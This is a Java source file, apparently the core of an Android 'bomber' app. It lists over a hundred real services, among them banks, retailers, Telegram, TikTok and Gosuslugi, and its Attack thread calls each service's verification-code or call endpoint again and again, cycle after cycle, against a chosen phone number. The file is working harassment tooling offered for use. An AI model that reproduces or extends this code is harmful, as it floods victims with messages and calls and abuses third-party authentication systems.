package com.dm.bomber;

import android.util.Log;

import com.dm.bomber.services.*;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.Response;

public class Bomber {
    private static final String TAG = "Bomber";
    private static final Service[] services = new Service[]{
            new Kari(), new Modulebank(), new YandexEda(),
            new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
            new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
            new Fivepost(), new Askona(), new FarforCall(), new Sephora(),
            new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
            new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
            new Zdravcity(), new Robocredit(), new Yandex(), new InDriver(),
            new Tinder(), new Gosuslugi(), new Tele2(), new Zoloto585(),
            new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
            new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
            new MegaDisk(), new KazanExpress(), new FoodBand(),
            new Benzuber(), new Citimobil(), new HHru(), new TikTok(),
            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
            new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
            new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
            new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
            new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
            new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
            new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
            new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
            new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
            new Mokka(), new FarforSMS(), new Stolichki(), new Mirkorma(),
            new YooMoney(), new Uchiru(), new Biua(), new MdFashion(),
            new XtraTV(), new AlloUa(), new Rulybka(), new Velobike(),
            new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
            new MTSBank(), new ATB(), new PerekrestokDostavka(), new Paygram(),
            new SravniMobile(), new Otkritie(), new TeaRU(), new PetStory(),
            new Profi(), new Eleven(), new Apteka(), new TochkaBank()
    };

    public static boolean isAlive(Attack attack) {
        return attack != null && attack.isAlive();
    }

    public static List<Service> getUsableServices(String phoneCode) {
        List<Service> usableServices = new ArrayList<>();

        for (Service service : services) {
            if (service.requireCode == null || service.requireCode.equals(phoneCode) || phoneCode.isEmpty())
                usableServices.add(service);
        }

        return usableServices;
    }

    public interface Callback {
        void onAttackEnd(boolean success);

        void onAttackStart(int serviceCount, int numberOfCycles);

        void onProgressChange(int progress);
    }

    public static class Attack extends Thread {
        private final Callback callback;
        private final String phoneCode;
        private final String phone;
        private final int numberOfCycles;

        private int progress = 0;

        private CountDownLatch tasks;

        public Attack(Callback callback, String phoneCode, String phone, int cycles) {
            super(phone);

            this.phoneCode = phoneCode;
            this.phone = phone;
            this.numberOfCycles = cycles;
            this.callback = callback;
        }

        @Override
        public void run() {
            List<Service> usableServices = getUsableServices(phoneCode);

            callback.onAttackStart(usableServices.size(), numberOfCycles);
            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));

            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                Log.i(TAG, String.format("Started cycle %s", cycle));

                tasks = new CountDownLatch(usableServices.size());

                for (Service service : usableServices) {
                    service.prepare(phoneCode, phone);

                    try {
                        service.run(new okhttp3.Callback() {
                            @Override
                            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                                Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);

                                tasks.countDown();
                                callback.onProgressChange(progress++);
                            }

                            @Override
                            public void onResponse(@NotNull Call call, @NotNull Response response) {
                                if (!response.isSuccessful()) {
                                    Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                            service.getClass().getName(), response.code()));
                                }

                                tasks.countDown();
                                callback.onProgressChange(progress++);
                            }
                        });
                    } catch (StringIndexOutOfBoundsException e) {
                        callback.onAttackEnd(false);

                        Log.i(TAG, "Invalid number format");
                        return;
                    }
                }

                try {
                    tasks.await();
                } catch (InterruptedException e) {
                    break;
                }
            }

            callback.onAttackEnd(true);
            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
        }
    }
}
